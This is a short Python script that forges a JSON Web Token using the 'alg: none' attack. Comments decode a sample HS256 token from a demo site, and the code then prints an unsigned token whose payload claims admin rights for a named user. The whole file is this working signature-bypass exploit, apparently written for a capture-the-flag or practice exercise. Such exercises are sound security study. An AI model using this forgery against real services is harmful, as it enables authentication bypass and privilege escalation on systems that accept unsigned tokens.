# -*- coding:utf-8 -*-

import jwt
import base64
# header
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
# {"typ":"JWT","alg":"HS256"}
#payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0
# {"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1504006435,"exp":1504006555,"data":{"hello":"world"}}

def b64urlencode(data):
    return base64.b64encode(data).replace(b'+', b'-').replace(b'/', b'_').replace(b'=', b'')

print(b64urlencode(b'{"alg":"none"}')+b'.'+b64urlencode(b'{"iat":1581412825,"admin":"true","user":"Sylvester"}')+b'.')

